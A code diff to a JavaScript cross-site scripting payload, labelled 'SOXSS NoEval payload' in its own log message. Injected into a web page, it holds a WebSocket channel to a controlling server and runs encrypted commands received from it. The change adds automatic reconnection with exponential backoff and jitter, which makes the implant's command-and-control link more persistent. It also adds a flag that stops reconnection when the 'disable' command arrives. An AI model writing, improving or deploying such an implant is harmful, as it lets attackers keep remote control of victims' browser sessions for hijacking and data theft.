@@ -1,4 +1,79 @@
 var webSocket = window.__SOXSS_SOCKET_NOEVAL__ || null;
+var runtimeState = window.__SOXSS_RUNTIME_NOEVAL__ || {
+    reconnectTimer: null,
+    reconnectAttempts: 0,
+    manualClose: false
+};
+window.__SOXSS_RUNTIME_NOEVAL__ = runtimeState;
+
+function clearReconnectTimer() {
+    if (runtimeState.reconnectTimer) {
+        clearTimeout(runtimeState.reconnectTimer);
+        runtimeState.reconnectTimer = null;
+    }
+}
+
+function scheduleReconnect() {
+    if (runtimeState.manualClose) {
+        return;
+    }
+    if (runtimeState.reconnectTimer) {
+        return;
+    }
+
+    runtimeState.reconnectAttempts += 1;
+    const cappedAttempt = Math.min(runtimeState.reconnectAttempts, 6);
+    const baseDelay = Math.min(1000 * Math.pow(2, cappedAttempt - 1), 30000);
+    const jitter = Math.floor(Math.random() * 500);
+    const delay = baseDelay + jitter;
+
+    runtimeState.reconnectTimer = setTimeout(function () {
+        runtimeState.reconnectTimer = null;
+        connectSocket();
+    }, delay);
+}
+
+function attachSocketHandlers(socket) {
+    socket.onopen = function () {
+        runtimeState.reconnectAttempts = 0;
+        clearReconnectTimer();
+        sendMessage({ type: 1 });
+    };
+
+    socket.onmessage = function (event) {
+        try {
+            const output = hex2a(decrypt(event.data));
+            let mes = JSON.parse(output);
+            _webs_Commands_[mes["Command"]](mes);
+        } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }); }
+    };
+
+    socket.onclose = function () {
+        scheduleReconnect();
+    };
+
+    socket.onerror = function () {
+        // Reconnect is handled by onclose.
+    };
+}
+
+function connectSocket() {
+    if (runtimeState.manualClose) {
+        return;
+    }
+    if (webSocket && (webSocket.readyState === 0 || webSocket.readyState === 1)) {
+        return;
+    }
+
+    try {
+        webSocket = new WebSocket(wsBase);
+        window.__SOXSS_SOCKET_NOEVAL__ = webSocket;
+        attachSocketHandlers(webSocket);
+    } catch (e) {
+        scheduleReconnect();
+    }
+}
+
 function sendMessage(msg) {
     if (!webSocket || webSocket.readyState !== 1) {
         return;
@@ -37,12 +112,8 @@ if (window.__SOXSS_BOOTSTRAPPED__) {
     console.info("SOXSS NoEval payload already active in this page context.");
 } else {
     window.__SOXSS_BOOTSTRAPPED__ = true;
-    webSocket = new WebSocket(wsBase);
-    window.__SOXSS_SOCKET_NOEVAL__ = webSocket;
-
-    webSocket.onopen = (e) => {
-        sendMessage({ type: 1 });
-    };
+    runtimeState.manualClose = false;
+    connectSocket();
 }
 
 /* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
@@ -69,20 +140,15 @@ var _webs_Commands_ = {
     },
     "disable": function (mes) {
         try {
+            runtimeState.manualClose = true;
+            clearReconnectTimer();
             webSocket.close();
         } catch (e) { }
     }
 }
 
 if (webSocket && !webSocket.onmessage) {
-    webSocket.onmessage = (event) => {
-        try {
-            const output = hex2a(decrypt(event.data));
-            let mes = JSON.parse(output)
-            _webs_Commands_[mes["Command"]](mes)
-        } catch (e) { sendMessage({ type: 0, msg: { outputType: "error", text: e.toString() } }) }
-
-    };
+    attachSocketHandlers(webSocket);
 }
 
 
